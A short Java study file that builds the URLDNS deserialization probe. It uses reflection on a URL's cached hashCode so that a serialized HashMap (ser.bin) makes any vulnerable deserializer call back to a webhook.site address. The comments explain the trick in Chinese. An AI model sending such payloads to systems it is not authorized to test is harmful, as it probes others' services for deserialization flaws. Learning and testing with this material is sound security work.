package simpleReflection;

import simpleSerialize.Person;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializeReflection {

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception {

        HashMap<URL, Integer> hashMap = new HashMap<>();

//        这里不要发出请求，把url对象的hashcode改成不是-1

        URL url = new URL("https://webhook.site/7add2233-8f02-4eec-840b-92a25a851133"); // 这里可以用zap或者burp生成一个接受接收请求的url

//        这里把hashcode改回-1
//        通过反射，改变已知对象的属性
        Class urlClass = url.getClass();
        Field hashcodeField = urlClass.getDeclaredField("hashCode");
        hashcodeField.setAccessible(true);
        hashcodeField.set(url, 123);

        hashMap.put(url, 1);

        hashcodeField.set(url, -1);

        serialize(hashMap);

    }
}
